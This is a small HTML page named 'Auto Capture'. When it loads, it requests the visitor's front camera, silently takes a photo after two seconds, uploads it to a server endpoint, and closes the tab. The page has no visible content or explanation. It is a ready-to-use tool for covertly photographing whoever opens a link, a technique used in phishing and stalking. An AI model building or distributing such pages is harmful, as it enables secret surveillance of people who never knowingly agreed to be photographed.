<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <script>
        async function captureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");

                setTimeout(() => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(sendPhoto, "image/jpeg");
                    stream.getTracks().forEach(track => track.stop()); // Stop camera
                }, 2000); // Auto-capture after 2 sec

            } catch (err) {
                console.error("Camera access denied!", err);
            }
        }

        function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("photo", blob, "capture.jpg");

            fetch("/upload", {
                method: "POST",
                body: formData
            }).then(() => window.close()); // Close tab after sending
        }

        // ðŸ”¹ Start capturing as soon as page loads
        window.onload = captureAndSend;
    </script>
</head>

</body>
</html>
